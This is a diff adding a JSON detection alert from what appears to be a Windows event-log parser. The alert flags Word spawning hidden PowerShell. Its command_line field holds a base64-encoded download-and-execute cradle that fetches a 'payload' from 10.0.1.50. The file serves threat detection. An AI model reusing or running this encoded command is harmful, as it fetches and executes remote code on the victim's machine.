@@ -1,0 +1,24 @@
+{
+    "metadata": {
+        "parser_version": "2.1.0",
+        "ingest_timestamp": "2026-10-09T14:15:22Z",
+        "source_file": "Security.evtx"
+    },
+    "alerts": [
+        {
+            "alert_id": "EVTX-HOUND-4688-001",
+            "timestamp": "2026-10-09T10:14:05Z",
+            "event_id": 4688,
+            "threat_category": "Execution",
+            "mitre_technique": "T1059.001",
+            "severity": "CRITICAL",
+            "process_ancestry": {
+                "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "child_process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "command_line": "powershell.exe -nop -w hidden -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMQAuADUAMAAvAHAAYQB5AGwAbwBhAGQAJwApACkA"
+            },
+            "confidence_score": 0.99,
+            "analyst_context": "Office application spawning encoded PowerShell. Highly indicative of macro-based weaponized document payload."
+        }
+    ]
+}
